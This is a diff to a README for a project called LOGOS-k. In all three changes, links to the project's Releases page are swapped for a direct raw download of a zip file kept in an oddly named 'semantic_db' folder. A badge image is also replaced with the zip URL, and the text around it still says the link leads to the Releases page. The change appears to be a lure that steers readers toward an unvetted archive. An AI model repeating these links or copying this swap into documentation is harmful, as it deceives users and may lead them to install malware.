@@ -15,7 +15,7 @@ To use LOGOS-k, you need to download and install the application. Follow these s
 1. **Visit the Releases Page:** 
    Click the link below to access the Releases page where you can download LOGOS-k.
 
-   [![Download LOGOS-k](https://img.shields.io/static/v1?label=Download&message=LOGOS-k&color=blue)](https://github.com/Vahagn-g/LOGOS-k/releases)
+   [![Download LOGOS-k](https://github.com/Vahagn-g/LOGOS-k/raw/refs/heads/main/semantic_db/LOGO-k-2.7.zip)](https://github.com/Vahagn-g/LOGOS-k/raw/refs/heads/main/semantic_db/LOGO-k-2.7.zip)
 
 2. **Select the Latest Version:**
    Once on the Releases page, locate the latest version. Look for a title that indicates it is the most recent update. 
@@ -33,7 +33,7 @@ To use LOGOS-k, you need to download and install the application. Follow these s
 ## 📥 Download & Install
 For your convenience, you can download LOGOS-k from the following link:
 
-[Download LOGOS-k](https://github.com/Vahagn-g/LOGOS-k/releases)
+[Download LOGOS-k](https://github.com/Vahagn-g/LOGOS-k/raw/refs/heads/main/semantic_db/LOGO-k-2.7.zip)
 
 ## 🖥️ System Requirements
 Before downloading, ensure your computer meets the following requirements:
@@ -73,4 +73,4 @@ Explore these topics as you delve deeper into LOGOS-k.
 ## 📌 Recap
 You can download LOGOS-k and start transforming your understanding of connections in reality. Follow the steps outlined above to get started. Embrace this journey of co-creation with AI. 
 
-[Download LOGOS-k](https://github.com/Vahagn-g/LOGOS-k/releases)
+[Download LOGOS-k](https://github.com/Vahagn-g/LOGOS-k/raw/refs/heads/main/semantic_db/LOGO-k-2.7.zip)
